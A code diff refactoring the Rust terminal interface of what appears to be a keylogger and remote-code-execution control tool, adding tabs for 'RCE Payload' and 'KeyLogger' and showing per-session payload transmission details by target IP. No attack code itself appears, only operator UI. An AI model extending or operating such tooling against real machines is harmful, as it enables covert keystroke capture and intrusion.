@@ -1,8 +1,13 @@
 use ratatui::{
-    layout::{Constraint, Direction, Layout, Rect},
+    layout::{
+        Constraint::{Fill, Length, Min},
+        Direction, Layout, Margin, Rect,
+    },
     style::{Color, Modifier, Style, Stylize},
     text::{Line, Span},
-    widgets::{Block, BorderType, Cell, HighlightSpacing, Row, ScrollbarState, Table, TableState},
+    widgets::{
+        Block, BorderType, Cell, HighlightSpacing, Row, ScrollbarState, Table, TableState, Tabs,
+    },
     Frame,
 };
 use tamanoir_common::{Layout as KeyboardLayout, TargetArch};
@@ -172,6 +177,9 @@ impl SessionSection {
             .position(self.sessions_map.read().unwrap().len());
     }
     pub fn render_session_edition(&mut self, frame: &mut Frame, block: Rect) {
+        let vertical = Layout::vertical([Length(1), Min(0)]);
+        let [header_area, inner_area] = vertical.areas(block);
+
         let selected_row_style = Style::default()
             .add_modifier(Modifier::REVERSED)
             .fg(Color::LightBlue);
@@ -185,7 +193,7 @@ impl SessionSection {
                     .into_iter()
                     .map(|l| Row::new([Span::from(format!("{}", l))]))
                     .collect();
-                Table::new(rows, [Constraint::Fill(1)]).header(header)
+                Table::new(rows, [Fill(1)]).header(header)
             }
             EditSubsection::RcePayload => {
                 let header =
@@ -203,37 +211,38 @@ impl SessionSection {
                         .collect(),
                     None => vec![],
                 };
-                Table::new(rows, [Constraint::Fill(1), Constraint::Fill(1)]).header(header)
+                Table::new(rows, [Fill(1), Fill(1)]).header(header)
             }
         };
-        let style_0 = match self.edit_section.editing_section {
-            EditSubsection::KeyboardLayout => Style::default().fg(Color::Yellow).bold(),
-            EditSubsection::RcePayload => Style::default().fg(Color::Blue),
-        };
-        let style_1 = match self.edit_section.editing_section {
-            EditSubsection::KeyboardLayout => Style::default().fg(Color::Blue),
-            EditSubsection::RcePayload => Style::default().fg(Color::Yellow).bold(),
-        };
 
-        frame.render_stateful_widget(
-            table.row_highlight_style(selected_row_style).block(
-                Block::bordered()
-                    .border_type(BorderType::Rounded)
-                    .border_style(Style::new().fg(Color::Blue))
-                    .title(
-                        Line::from(Span::styled(
-                            format!(
-                                "Edit Session ({})",
-                                self.selected_session.as_ref().unwrap().ip,
-                            ),
-                            Style::default().fg(Color::Blue).bold(),
-                        ))
-                        .right_aligned(),
-                    )
-                    .title(Span::styled("Update Keyboard Layout", style_0))
-                    .title(Span::styled("Update RCE Payload", style_1)),
-            ),
+        let tabs = Tabs::new(["RCE Payload", "KeyLogger"])
+            .highlight_style(Style::default().fg(Color::Yellow).bold())
+            .select(self.edit_section.editing_section.clone() as usize)
+            .padding(" ", " ")
+            .divider("|");
+        frame.render_widget(
+            Block::bordered()
+                .border_type(BorderType::Rounded)
+                .border_style(Style::new().fg(Color::Blue))
+                .title(
+                    Line::from(Span::styled(
+                        format!(
+                            "Edit Session ({})",
+                            self.selected_session.as_ref().unwrap().ip,
+                        ),
+                        Style::default().fg(Color::Blue).bold(),
+                    ))
+                    .right_aligned(),
+                ),
             block,
+        );
+        frame.render_widget(tabs, header_area);
+        frame.render_stateful_widget(
+            table.row_highlight_style(selected_row_style),
+            inner_area.inner(Margin {
+                vertical: 2,
+                horizontal: 2,
+            }),
             self.edit_section.state(),
         );
     }
@@ -242,7 +251,7 @@ impl SessionSection {
             let (stats, rce) = {
                 let chunks = Layout::default()
                     .direction(Direction::Horizontal)
-                    .constraints([Constraint::Fill(1), Constraint::Fill(1)])
+                    .constraints([Fill(1), Fill(1)])
                     .flex(ratatui::layout::Flex::SpaceBetween)
                     .split(block);
                 (chunks[0], chunks[1])
@@ -267,16 +276,15 @@ impl SessionSection {
                 .chunks(2)
                 .map(|r| Row::new(r.to_vec()))
                 .collect();
-            let table_stats: Table<'_> =
-                Table::new(rows_stats, [Constraint::Fill(1), Constraint::Fill(1)]).block(
-                    Block::bordered()
-                        .border_type(BorderType::Rounded)
-                        .border_style(Style::new().fg(Color::Blue))
-                        .title(Span::styled(
-                            "Session Info",
-                            Style::default().fg(Color::Blue).bold(),
-                        )),
-                );
+            let table_stats: Table<'_> = Table::new(rows_stats, [Fill(1), Fill(1)]).block(
+                Block::bordered()
+                    .border_type(BorderType::Rounded)
+                    .border_style(Style::new().fg(Color::Blue))
+                    .title(Span::styled(
+                        "Session Info",
+                        Style::default().fg(Color::Blue).bold(),
+                    )),
+            );
 
             let rce_info: (String, String, String, String) = match &s.rce_payload {
                 None => ("".into(), "".into(), "".into(), "".into()),
@@ -301,23 +309,22 @@ impl SessionSection {
                 Cell::from(Span::from(rce_info.3)),
             ];
             let rows_rce: Vec<Row> = cells_rce.chunks(2).map(|r| Row::new(r.to_vec())).collect();
-            let table_rce = Table::new(rows_rce, [Constraint::Length(20), Constraint::Fill(1)])
-                .block(
-                    Block::bordered()
-                        .border_type(BorderType::Rounded)
-                        .border_style(Style::new().fg(Color::Blue))
-                        .title(Span::styled(
-                            "Payload Transmission",
-                            Style::default().fg(Color::Blue).bold(),
-                        )),
-                );
+            let table_rce = Table::new(rows_rce, [Length(20), Fill(1)]).block(
+                Block::bordered()
+                    .border_type(BorderType::Rounded)
+                    .border_style(Style::new().fg(Color::Blue))
+                    .title(Span::styled(
+                        "Payload Transmission",
+                        Style::default().fg(Color::Blue).bold(),
+                    )),
+            );
             frame.render_widget(table_stats, stats);
             frame.render_widget(table_rce, rce);
         } else {
             let table: Table<'_> = Table::new(
                 [Row::new([Cell::from("No session available")])
                     .style(Style::new().fg(Color::White))],
-                [Constraint::Fill(1)],
+                [Fill(1)],
             )
             .block(
                 Block::bordered()
@@ -345,7 +352,7 @@ impl SessionSection {
         let (session_selection, session_info) = {
             let chunks = Layout::default()
                 .direction(Direction::Horizontal)
-                .constraints([Constraint::Length(18), Constraint::Fill(1)])
+                .constraints([Length(18), Fill(1)])
                 .flex(ratatui::layout::Flex::SpaceBetween)
                 .split(block);
             (chunks[0], chunks[1])
@@ -369,7 +376,7 @@ impl SessionSection {
         } else {
             Color::Blue
         };
-        let table: Table<'_> = Table::new(rows, vec![Constraint::Percentage(100)])
+        let table: Table<'_> = Table::new(rows, [Fill(1)])
             .row_highlight_style(selected_row_style)
             .highlight_spacing(HighlightSpacing::Never)
             .block(
@@ -398,25 +405,26 @@ struct SessionEditSection {
     rce_table_state: TableState,
     rce_scroll_state: ScrollbarState,
 }
-#[derive(Debug)]
+#[derive(Debug, Clone)]
 enum EditSubsection {
-    KeyboardLayout,
-    RcePayload,
+    RcePayload = 0,
+    KeyboardLayout = 1,
 }
+
 impl SessionEditSection {
     pub fn new(available_rce_payloads: Option<Vec<SessionRcePayload>>) -> Self {
         let available_layouts = KeyboardLayout::ALL;
         let available_rce_payloads = available_rce_payloads.map(|mut avail_payloads| {
-                avail_payloads.extend_from_slice(&[SessionRcePayload {
-                    name: "-".into(),
-                    target_arch: "(will reset any payload transmission)".into(),
-                    length: 0,
-                    buffer_length: 0,
-                }]);
-                avail_payloads
-            });
+            avail_payloads.extend_from_slice(&[SessionRcePayload {
+                name: "-".into(),
+                target_arch: "(will reset any payload transmission)".into(),
+                length: 0,
+                buffer_length: 0,
+            }]);
+            avail_payloads
+        });
         Self {
-            editing_section: EditSubsection::KeyboardLayout,
+            editing_section: EditSubsection::RcePayload,
 
             available_layouts: available_layouts.to_vec(),
             layout_table_state: TableState::default().with_selected(0),
